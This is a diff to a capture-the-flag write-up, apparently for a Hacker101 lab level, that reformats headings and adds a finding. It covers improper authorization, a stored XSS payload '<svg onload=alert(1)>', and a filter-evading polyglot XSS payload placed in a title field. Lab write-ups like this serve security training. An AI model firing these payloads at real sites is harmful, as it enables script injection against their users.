@@ -13,7 +13,7 @@
     
  
 
-**Improper Authorization:**       
+## Improper Authorization:       
 Look at script at bottom of page source:    
 
 ```// We should only display the edit link to authenticated admins.
@@ -36,10 +36,17 @@ Look at script at bottom of page source:
 
 ----
 
-**Stored XSS (Body)**
+## Stored XSS (Body)
 
 Enter payload into body and POST     
-```"<svg onload=alert(1)>```
+`"<svg onload=alert(1)>`
 
 ![Stored XSS in Body](https://github.com/Isopach/Hacker101/blob/master/img/level3_stored_xss_body.png)
 
+
+## Self XSS (Head)
+
+Enter payload into title:     
+`jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e`   
+
+![Self XSS in Head](https://github.com/Isopach/Hacker101/blob/master/img/level3_self_xss_head.png)
